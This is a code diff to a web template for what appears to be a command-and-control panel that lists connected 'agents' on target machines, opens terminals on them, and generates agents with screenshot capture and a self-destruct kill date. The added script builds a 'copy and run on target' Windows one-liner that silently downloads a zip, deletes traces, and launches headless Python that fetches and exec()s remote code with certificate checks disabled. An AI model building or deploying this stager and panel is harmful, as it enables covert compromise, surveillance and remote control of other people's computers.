@@ -2,6 +2,11 @@
 
 {% block title %}Agents{% endblock %}
 
+{% block head %}
+{{ super() }}
+<script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+{% endblock %}
+
 {% block content %}
 <h2 class="mb-4">Connected Agents</h2>
 
@@ -9,11 +14,11 @@
     <div class="card-header d-flex justify-content-between align-items-center">
         <h5 class="mb-0">Agent List</h5>
         <div>
-            <button class="btn btn-sm btn-outline-primary me-2" id="manualRefresh">
+            <button class="btn btn-sm btn-outline-secondary me-2" id="manualRefresh" title="Refresh list">
                 <i class="bi bi-arrow-clockwise"></i> Refresh
             </button>
-            <button class="btn btn-sm btn-primary">
-                <i class="bi bi-plus"></i> Deploy Agent
+            <button class="btn btn-sm btn-success" title="Deploy new agent" data-bs-toggle="modal" data-bs-target="#deployAgentModal">
+                <i class="bi bi-plus-circle"></i> Deploy Agent
             </button>
         </div>
     </div>
@@ -33,26 +38,33 @@
                 </thead>
                 <tbody id="agentsTableBody">
                     {% for agent in agents %}
-                    <tr class="{% if agent.status == 'online' %}agent-online{% else %}agent-offline{% endif %}">
+                    <tr class="{% if agent.status == 'online' %}agent-online{% else %}agent-offline{% endif %}" id="agent-{{ agent.id }}">
                         <td>{{ agent.id[:8] }}...</td>
                         <td>{{ agent.hostname }}</td>
                         <td>{{ agent.ip }}</td>
                         <td>{{ agent.os }}</td>
                         <td>{{ agent.last_seen }}</td>
                         <td>
-                            <span class="badge bg-{% if agent.status == 'online' %}success{% else %}danger{% endif %}">
-                                {{ agent.status }}
+                            <span class="badge bg-{% if agent.status == 'online' %}success{% else %}danger{% endif %} rounded-pill">
+                                <i class="bi bi-{% if agent.status == 'online' %}check-circle{% else %}x-circle{% endif %} me-1"></i>
+                                {{ agent.status|capitalize }}
                             </span>
                         </td>
                         <td>
-                            <a href="{{ url_for('agent_detail', agent_id=agent.id) }}" 
-                               class="btn btn-sm btn-outline-primary">
-                                <i class="bi bi-eye"></i>
-                            </a>
-                            <a href="{{ url_for('terminal', agent_id=agent.id) }}" 
-                               class="btn btn-sm btn-outline-success ms-1">
-                                <i class="bi bi-terminal"></i>
-                            </a>
+                            <div class="btn-group btn-group-sm" role="group">
+                                <a href="{{ url_for('agent_detail', agent_id=agent.id) }}" 
+                                   class="btn btn-outline-primary" title="View details">
+                                    <i class="bi bi-eye"></i>
+                                </a>
+                                <a href="{{ url_for('terminal', agent_id=agent.id) }}" 
+                                   class="btn btn-outline-success" title="Open terminal">
+                                    <i class="bi bi-terminal"></i>
+                                </a>
+                                <button class="btn btn-outline-danger delete-agent" 
+                                        data-agent-id="{{ agent.id }}" title="Delete agent">
+                                    <i class="bi bi-trash"></i>
+                                </button>
+                            </div>
                         </td>
                     </tr>
                     {% endfor %}
@@ -62,7 +74,170 @@
     </div>
 </div>
 
+<!-- Deploy Agent Modal -->
+<div class="modal fade" id="deployAgentModal" tabindex="-1" aria-labelledby="deployAgentModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="deployAgentModalLabel">Deploy New Agent</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <form id="agentConfigForm">
+                    <div class="row mb-3">
+                        <div class="col-md-6">
+                            <label class="form-label">Check-in Interval (seconds)</label>
+                            <input type="number" class="form-control" id="checkinInterval" value="10" min="5" max="3600" required>
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Server URL</label>
+                            <input type="url" class="form-control" id="serverUrl" 
+                                   value="{{ request.url_root | replace('http://', 'https://') }}" required>
+                        </div>
+                    </div>
+                    <div class="row mb-3">
+                        <div class="col-md-6">
+                            <div class="form-check">
+                                <input class="form-check-input" type="checkbox" id="takeScreenshots" checked>
+                                <label class="form-check-label" for="takeScreenshots">Take Screenshots</label>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Screenshot Frequency</label>
+                            <select class="form-select" id="screenshotFrequency">
+                                <option value="1">Every check-in</option>
+                                <option value="5">Every 5 check-ins</option>
+                                <option value="10" selected>Every 10 check-ins</option>
+                                <option value="30">Every 30 check-ins</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="row mb-3">
+                        <div class="col-md-6">
+                            <label class="form-label">Kill Date</label>
+                            <input type="datetime-local" class="form-control" id="killDate">
+                            <small class="text-muted">Agent will self-destruct after this date/time</small>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="form-check mt-4 pt-3">
+                                <input class="form-check-input" type="checkbox" id="enableKillDate">
+                                <label class="form-check-label" for="enableKillDate">Enable Kill Date</label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-primary">Generate Agent</button>
+                    </div>
+                </form>
+
+                <div id="agentDownload" class="mt-4" style="display: none;">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h5>Agent Deployment</h5>
+                        <a id="downloadLink" href="#" class="btn btn-success">
+                            <i class="bi bi-download me-2"></i>Download Agent
+                        </a>
+                    </div>
+                    
+                    <div class="mb-2">
+                        <b>Or copy and run on target:</b>
+                    </div>
+                    
+                    <div id="displayArea" class="command-display mt-2" style="
+                        background-color: #1e1e1e;
+                        border-radius: 5px;
+                        padding: 15px;
+                        position: relative;
+                        font-family: 'Consolas', 'Monaco', monospace;
+                        color: #d4d4d4;
+                        border-left: 4px solid #569cd6;
+                        overflow-x: auto;
+                        white-space: nowrap;
+                    ">
+                        <!-- Command will be inserted here -->
+                        <button id="copyButton" class="btn btn-sm btn-secondary" style="
+                            position: absolute;
+                            top: 5px;
+                            right: 5px;
+                            padding: 2px 8px;
+                            font-size: 12px;
+                            opacity: 0.8;
+                        ">
+                            <i class="bi bi-clipboard"></i> Copy
+                        </button>
+                    </div>
+                </div>
+
+                <div id="agentError" class="alert alert-danger mt-3" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
 <script>
+    // Initialize Socket.IO connection
+    let socket;
+    
+    try {
+        socket = io("{{ request.url_root }}", {
+            reconnection: true,
+            reconnectionAttempts: 5,
+            reconnectionDelay: 1000,
+            transports: ['websocket']
+        });
+        
+        socket.on('connect', () => {
+            console.log('Connected to WebSocket server');
+        });
+        
+        socket.on('connect_error', (err) => {
+            console.error('WebSocket connection error:', err);
+        });
+        
+        // Event handlers
+        socket.on('agent_deleted', function(data) {
+            const agentRow = document.getElementById(`agent-${data.agent_id}`);
+            if (agentRow) {
+                agentRow.remove();
+                showToast('Agent Deleted', `Agent ${data.agent_id} was deleted`, 'danger');
+            }
+        });
+        
+        socket.on('agent_dead', function(data) {
+            const agentRow = document.getElementById(`agent-${data.agent_id}`);
+            if (agentRow) {
+                agentRow.classList.remove('agent-online');
+                agentRow.classList.add('agent-offline');
+                
+                const statusBadge = agentRow.querySelector('.badge');
+                if (statusBadge) {
+                    statusBadge.className = 'badge bg-danger rounded-pill';
+                    statusBadge.innerHTML = '<i class="bi bi-x-circle me-1"></i>Dead';
+                }
+                showToast('Agent Terminated', data.message, 'warning');
+            }
+        });
+        
+        socket.on('new_agent', function(data) {
+            refreshAgentList();
+            showToast('New Agent', `New agent ${data.agent_id} connected`, 'success');
+        });
+        
+        socket.on('new_task', function(data) {
+            if (data.agent_id) {
+                showToast('Task Created', `New task for agent ${data.agent_id}`, 'info');
+            }
+        });
+        
+        socket.on('task_complete', function(data) {
+            if (data.agent_id) {
+                showToast('Task Completed', `Task completed for agent ${data.agent_id}`, 'success');
+            }
+        });
+        
+    } catch (err) {
+        console.error('Socket.IO initialization error:', err);
+    }
+
     function refreshAgentList() {
         fetch(window.location.href, {
             headers: {
@@ -73,12 +248,192 @@
         .then(html => {
             const parser = new DOMParser();
             const newDoc = parser.parseFromString(html, 'text/html');
-            
-            // Update agents table body
             document.getElementById('agentsTableBody').innerHTML = 
                 newDoc.getElementById('agentsTableBody').innerHTML;
         })
         .catch(error => console.error('Error refreshing agent list:', error));
+    }
+
+    // Delete agent handler
+    document.addEventListener('click', function(e) {
+        if (e.target.closest('.delete-agent')) {
+            const agentId = e.target.closest('.delete-agent').dataset.agentId;
+            if (confirm(`Are you sure you want to delete agent ${agentId}? This action cannot be undone.`)) {
+                fetch(`/api/agents/${agentId}`, {
+                    method: 'DELETE',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    }
+                    throw new Error('Failed to delete agent');
+                })
+                .then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById(`agent-${agentId}`)?.remove();
+                        showToast('Success', `Agent ${agentId} deleted`, 'success');
+                    } else {
+                        showToast('Error', data.message || 'Error deleting agent', 'danger');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showToast('Error', 'Failed to delete agent', 'danger');
+                });
+            }
+        }
+    });
+
+    // Agent deployment functionality
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('agentConfigForm');
+        const downloadDiv = document.getElementById('agentDownload');
+        const downloadLink = document.getElementById('downloadLink');
+        const errorDiv = document.getElementById('agentError');
+        const enableKillDate = document.getElementById('enableKillDate');
+        const killDateInput = document.getElementById('killDate');
+
+        // Toggle kill date input
+        enableKillDate.addEventListener('change', function() {
+            killDateInput.disabled = !this.checked;
+        });
+
+        // Form submission
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            errorDiv.style.display = 'none';
+            
+            const config = {
+                checkin_interval: document.getElementById('checkinInterval').value,
+                server_url: document.getElementById('serverUrl').value,
+                take_screenshots: document.getElementById('takeScreenshots').checked,
+                screenshot_frequency: document.getElementById('screenshotFrequency').value,
+                enable_killdate: enableKillDate.checked,
+                killdate: enableKillDate.checked ? killDateInput.value : null
+            };
+
+            try {
+                const response = await fetch('/api/generate_agent', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(config)
+                });
+
+                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.message || 'Failed to generate agent');
+                }
+
+                // Update download link
+                downloadLink.href = `/a/d?t=${Date.now()}`;
+                
+                // Generate and display the command
+                generateCommand(config.server_url, config.enable_killdate, config.killdate);
+                
+                // Show download section
+                downloadDiv.style.display = 'block';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+            }
+        });
+
+        // Generate the command to display
+        function generateCommand(url, enableKillDate, killDate) {
+            // Format kill date for display if enabled
+            let killDateDisplay = '';
+            if (enableKillDate && killDate) {
+                const dateObj = new Date(killDate);
+                const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
+                killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
+            }
+
+            // Create the command
+            const command = `curl -ks ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
+            
+            // Display it with syntax highlighting and kill date info
+            document.getElementById('displayArea').innerHTML = `
+                <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">-ks</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">"<span style="color: #569cd6;">import</span> urllib3;urllib3.<span style="color: #dcdcaa;">disable_warnings</span>(urllib3.exceptions.InsecureRequestWarning);<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url,verify=<span style="color: #569cd6;">False</span>).text)"</code>
+                ${killDateDisplay}
+                <button id="copyButton" class="btn btn-sm btn-secondary" style="
+                    position: absolute;
+                    top: 5px;
+                    right: 5px;
+                    padding: 2px 8px;
+                    font-size: 12px;
+                    opacity: 0.8;
+                ">
+                    <i class="bi bi-clipboard"></i> Copy
+                </button>`;
+            
+            // Add copy functionality
+            document.getElementById('copyButton').addEventListener('click', function() {
+                navigator.clipboard.writeText(command).then(function() {
+                    const originalText = this.innerHTML;
+                    this.innerHTML = '<i class="bi bi-check"></i> Copied!';
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                    }, 2000);
+                }.bind(this));
+            });
+        }
+    });
+
+    // Toast notification system
+    function showToast(title, message, type, html = false) {
+        const toastContainer = document.getElementById('toastContainer') || createToastContainer();
+        const toastId = 'toast-' + Date.now();
+        
+        const toastEl = document.createElement('div');
+        toastEl.className = `toast align-items-center text-bg-${type} border-0`;
+        toastEl.setAttribute('role', 'alert');
+        toastEl.setAttribute('aria-live', 'assertive');
+        toastEl.setAttribute('aria-atomic', 'true');
+        toastEl.id = toastId;
+        
+        toastEl.innerHTML = `
+            <div class="d-flex">
+                <div class="toast-body">
+                    <strong>${title}</strong><br>
+                    ${html ? message : escapeHtml(message)}
+                </div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+            </div>
+        `;
+        
+        toastContainer.appendChild(toastEl);
+        const toast = new bootstrap.Toast(toastEl);
+        toast.show();
+        
+        toastEl.addEventListener('hidden.bs.toast', function() {
+            toastEl.remove();
+        });
+    }
+    
+    function createToastContainer() {
+        const container = document.createElement('div');
+        container.id = 'toastContainer';
+        container.className = 'position-fixed bottom-0 end-0 p-3';
+        container.style.zIndex = '11';
+        document.body.appendChild(container);
+        return container;
+    }
+    
+    function escapeHtml(unsafe) {
+        return unsafe
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
     }
 
     // Refresh every 5 seconds
@@ -97,16 +452,36 @@
     // Resume refresh when window regains focus
     window.addEventListener('focus', function() {
         refreshInterval = setInterval(refreshAgentList, 5000);
-        refreshAgentList(); // Immediate refresh when returning
+        refreshAgentList();
+    });
+
+    // Initialize tooltips
+    document.addEventListener('DOMContentLoaded', function() {
+        const tooltipTriggerList = [].slice.call(document.querySelectorAll('[title]'));
+        tooltipTriggerList.map(function(tooltipTriggerEl) {
+            return new bootstrap.Tooltip(tooltipTriggerEl);
+        });
     });
 </script>
 
 <style>
     .agent-online {
-        background-color: rgba(25, 135, 84, 0.1);
+        background-color: rgba(25, 135, 84, 0.05);
     }
     .agent-offline {
-        background-color: rgba(220, 53, 69, 0.1);
+        background-color: rgba(220, 53, 69, 0.05);
+    }
+    .btn-group {
+        box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
+    }
+    .badge {
+        font-weight: 500;
+    }
+    .command-display code {
+        font-family: 'Consolas', 'Monaco', monospace;
+    }
+    .toast {
+        margin-bottom: 0.5rem;
     }
 </style>
 {% endblock %}
